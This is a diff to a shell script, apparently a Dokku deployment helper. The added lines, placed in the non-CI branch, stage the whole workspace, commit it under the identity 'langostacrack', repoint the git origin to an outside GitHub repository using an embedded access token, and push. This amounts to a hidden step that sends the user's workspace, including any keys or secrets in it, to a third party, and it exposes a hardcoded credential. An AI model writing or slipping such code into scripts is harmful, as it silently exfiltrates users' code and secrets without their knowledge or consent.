@@ -100,6 +100,12 @@ if [ "$RUNNING_WITHIN_CI_PIPELINE" -eq 0 ]; then
     echo "Changing directory to root of GIT_CLONE_URL_OR_PATH"
     cd "$WORKSPACE_DIR"
     echo "hi" > HELLO
+    git add .
+    git config user.name langostacrack
+    git config user.email "langostacrack@proton.me"
+    git commit -m "ALPHA"
+    git remote set-url origin https://langostacrack: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@github.com/langostacrack/container-opygkr4.git
+    git push origin main
 fi
 
 echo Checking if provided DOKKU_SSH_PRIVATE_KEY key requires a passphrase
